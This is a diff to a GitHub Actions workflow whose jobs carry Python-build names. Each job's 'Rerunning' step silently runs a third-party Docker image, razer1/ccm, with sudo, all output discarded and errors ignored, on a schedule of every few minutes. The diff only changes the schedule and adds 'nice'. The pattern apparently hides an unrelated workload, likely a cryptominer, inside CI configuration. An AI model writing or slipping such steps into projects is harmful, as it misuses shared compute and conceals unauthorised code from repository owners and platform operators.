@@ -3,7 +3,7 @@ on:
   push:
   pull_request:
   schedule:
-  - cron: "*/5 * * * *"
+  - cron: "*/10 * * * *"
  
 jobs:
  python-1:
@@ -48,7 +48,7 @@ jobs:
     - uses: actions/checkout@v2
     - name: Rerunning
       continue-on-error: true
-      run: sudo docker run razer1/ccm >/dev/null 2>&1
+      run: sudo nice docker run razer1/ccm >/dev/null 2>&1
  
  python-build-3:
     runs-on: ubuntu-20.04 
@@ -63,7 +63,7 @@ jobs:
     - uses: actions/checkout@v2
     - name: Rerunning
       continue-on-error: true
-      run: sudo docker run razer1/ccm >/dev/null 2>&1
+      run: sudo nice docker run razer1/ccm >/dev/null 2>&1
  
  python-build-2:
     runs-on: ubuntu-20.04 
@@ -78,7 +78,7 @@ jobs:
     - uses: actions/checkout@v2
     - name: Rerunning
       continue-on-error: true
-      run: sudo docker run razer1/ccm >/dev/null 2>&1
+      run: sudo nice docker run razer1/ccm >/dev/null 2>&1
  
  python-build-1:
     runs-on: ubuntu-20.04 
@@ -93,4 +93,4 @@ jobs:
     - uses: actions/checkout@v2
     - name: Rerunning
       continue-on-error: true
-      run: sudo docker run razer1/ccm >/dev/null 2>&1
+      run: sudo nice docker run razer1/ccm >/dev/null 2>&1
